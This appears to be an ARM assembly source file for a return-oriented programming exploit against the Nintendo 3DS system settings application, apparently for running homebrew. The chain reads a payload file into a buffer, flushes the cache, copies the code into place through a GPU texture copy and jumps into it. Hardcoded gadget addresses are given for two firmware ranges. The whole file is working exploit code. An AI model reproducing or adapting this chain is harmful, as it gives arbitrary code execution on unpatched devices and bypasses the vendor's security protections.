	.arm
	.text

#include "rop3ds/rop.h"

#ifndef MSET_ARM_CODE_SIZE
	#define MSET_ARM_CODE_SIZE 0x00004000
#endif

	.global	_start
@---------------------------------------------------------------------------------
_start:
	rop_store(THIS+4, ARM_CODE_OFFSET)
	rop_file_read(THIS, THIS+0x20, BUFFER_LOC, MSET_ARM_CODE_SIZE)
	rop_flush_data_cache(BUFFER_LOC, MSET_ARM_CODE_SIZE)
	rop_gx_texture_copy(BUFFER_LOC, CODE_TARGET, MSET_ARM_CODE_SIZE)
	rop_sleep(1000000000)
	rop_jump_arm

#if defined(MSET_4X) || defined(MSET_4X_DG) || defined (MSET_4X_NDG)
	.word	0x001346C4	@ GSPGPU_FlushDataCache
	.word	0x001AC924	@ nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue
	.word	0x001B82A8	@ fopen
	.word	0x001B3954	@ fread
	.word	0x0027C580 + 0x58	@ gpuHandle
#else
	.word	0x00134A84	@ GSPGPU_FlushDataCache
	.word	0x001B4E8C	@ nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue
	.word	0x001C08B4	@ fopen
	.word	0x001BC188	@ fread
	.word	0x0028A580 + 0x58	@ gpuHandle
#endif
